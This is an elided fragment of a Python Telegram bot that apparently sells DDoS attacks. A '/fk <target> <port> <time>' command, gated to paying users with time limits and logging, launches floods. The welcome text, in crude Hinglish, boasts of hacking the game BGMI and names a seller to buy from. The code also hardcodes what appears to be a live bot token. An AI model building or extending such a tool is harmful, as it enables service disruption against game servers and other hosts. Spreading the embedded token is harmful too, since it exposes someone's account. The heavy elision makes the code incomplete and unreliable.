...
bot = telebot.TeleBot('8157379227:AAH5wdKp7Jo7seIs9xdIqQXTigCMkLVH1dU')
...
def start_attack_reply(message, target, port, time):
    ...
    # Dictionary to store the last time each user ran the /fk command
bgmi_cooldown = {}
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, port, and time
            ...
            if time > 240:
                ...
                try:
                    record_command_logs(user_id, '/fk', target, port, time)
            ...
            response = "Usage: /fk <target> <port> <time>"
    else:
...
def welcome_start(message):
    ...
    response = f'''🔥𝙎𝙊𝙈𝙎 ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
